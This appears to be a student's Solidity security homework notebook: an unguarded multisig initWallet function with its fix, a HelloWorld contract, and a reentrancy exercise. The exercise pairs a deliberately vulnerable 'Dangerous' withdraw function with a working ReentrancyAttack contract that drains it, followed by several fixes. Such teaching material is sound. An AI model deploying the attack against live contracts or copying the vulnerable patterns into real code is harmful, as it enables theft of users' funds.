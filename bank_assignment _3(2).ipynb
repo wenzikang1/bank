{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bb2c56ee",
   "metadata": {},
   "source": [
    "# Question 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba32e24d",
   "metadata": {},
   "outputs": [],
   "source": [
    "// constructor - just pass on the owner array to the multivorced and\n",
    "// the limit to daylimit\n",
    "function initWallet(address[] _owners, uint _required, uint _daylimit) {\n",
    "    initDaylimit(_daylimit);\n",
    "    initMultivorced(_owners, _required);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f01a14ee",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "constructor(address[] _owners, uint _required, uint _daylimit) {\n",
    "    initDaylimit(_daylimit);\n",
    "    initMultivorced(_owners, _required);\n",
    "}\n",
    "\n",
    "bool private initialized = false;\n",
    "\n",
    "function initWallet(address[] _owners, uint _required, uint _daylimit) {\n",
    "    require(!initialized, \"Already initialized\");\n",
    "    initDaylimit(_daylimit);\n",
    "    initMultivorced(_owners, _required);\n",
    "    initialized = true;\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7d3e1dec",
   "metadata": {},
   "source": [
    "# Question 5"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5d9993d3",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54416f19",
   "metadata": {},
   "outputs": [],
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity ^0.8.0;\n",
    "\n",
    "contract HelloWorld {\n",
    "    string private greeting = \"Hello, world!\";\n",
    "    \n",
    "    function getGreeting() public view returns (string memory) {\n",
    "        return greeting;\n",
    "    }\n",
    "    \n",
    "    function setGreeting(string memory _newGreeting) public {\n",
    "        greeting = _newGreeting;\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90c0f722",
   "metadata": {},
   "outputs": [],
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity >=0.5.1 <0.9.0;\n",
    "\n",
    "contract HelloWorld {\n",
    "    string private greeting;\n",
    "\n",
    "    constructor() {\n",
    "        greeting = \"Hello, world!\";\n",
    "    }\n",
    "\n",
    "    function getGreeting() public view returns (string memory) {\n",
    "        return greeting;\n",
    "    }\n",
    "\n",
    "    function setGreeting(string memory _newGreeting) public {\n",
    "        greeting = _newGreeting;\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b48ea30",
   "metadata": {},
   "source": [
    "# Question 6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66de3d87",
   "metadata": {},
   "outputs": [],
   "source": [
    "pragma solidity ^0.4.24;\n",
    "\n",
    "contract Dangerous {\n",
    "    mapping(address => uint) deposits;\n",
    "    \n",
    "    function depositMoney() public payable {\n",
    "        deposits[msg.sender] += msg.value;\n",
    "    }\n",
    "    \n",
    "    function withdraw(uint amount) public {\n",
    "        require(deposits[msg.sender] >= amount);\n",
    "        if (!msg.sender.call.value(amount)()) {\n",
    "            revert();\n",
    "        }\n",
    "        deposits[msg.sender] -= amount; // 错误：状态更新在外部调用之后\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1fc2d8b",
   "metadata": {},
   "outputs": [],
   "source": [
    "pragma solidity ^0.4.24;\n",
    "\n",
    "interface Dangerous {\n",
    "    function depositMoney() external payable;\n",
    "    function withdraw(uint amount) external;\n",
    "}\n",
    "\n",
    "contract ReentrancyAttack {\n",
    "    Dangerous public target;\n",
    "    uint public attackAmount;\n",
    "    \n",
    "    constructor(address _target) public {\n",
    "        target = Dangerous(_target);\n",
    "    }\n",
    "    \n",
    "    function attack() public payable {\n",
    "        require(msg.value > 0);\n",
    "        target.depositMoney.value(msg.value)();\n",
    "        attackAmount = msg.value;\n",
    "        target.withdraw(attackAmount);\n",
    "    }\n",
    "    \n",
    "    function() public payable {\n",
    "        if (address(target).balance >= attackAmount) {\n",
    "            target.withdraw(attackAmount);\n",
    "        }\n",
    "    }\n",
    "    \n",
    "    function collectEther() public {\n",
    "        msg.sender.transfer(address(this).balance);\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "878cbd7e",
   "metadata": {},
   "outputs": [],
   "source": [
    "function withdraw(uint amount) public {\n",
    "    require(deposits[msg.sender] >= amount);\n",
    "    \n",
    "    // EFFECTS: 先更新状态\n",
    "    deposits[msg.sender] -= amount;\n",
    "    \n",
    "    // INTERACTIONS: 最后进行外部调用\n",
    "    if (!msg.sender.call.value(amount)()) {\n",
    "        revert();\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06e550d6",
   "metadata": {},
   "outputs": [],
   "source": [
    "bool private locked = false;\n",
    "\n",
    "function withdraw(uint amount) public {\n",
    "    require(!locked, \"Reentrancy detected\");\n",
    "    require(deposits[msg.sender] >= amount);\n",
    "    \n",
    "    locked = true;\n",
    "    deposits[msg.sender] -= amount;\n",
    "    \n",
    "    if (!msg.sender.call.value(amount)()) {\n",
    "        revert();\n",
    "    }\n",
    "    \n",
    "    locked = false;\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "62a9350f",
   "metadata": {},
   "outputs": [],
   "source": [
    "function withdraw(uint amount) public {\n",
    "    require(deposits[msg.sender] >= amount);\n",
    "    deposits[msg.sender] -= amount;\n",
    "    payable(msg.sender).transfer(amount);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e130e871",
   "metadata": {},
   "outputs": [],
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity ^0.8.0;\n",
    "\n",
    "import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n",
    "\n",
    "contract SecureWallet is ReentrancyGuard {\n",
    "    mapping(address => uint) deposits;\n",
    "    \n",
    "    function withdraw(uint amount) public nonReentrant {\n",
    "        require(deposits[msg.sender] >= amount);\n",
    "        deposits[msg.sender] -= amount;\n",
    "        payable(msg.sender).transfer(amount);\n",
    "    }\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
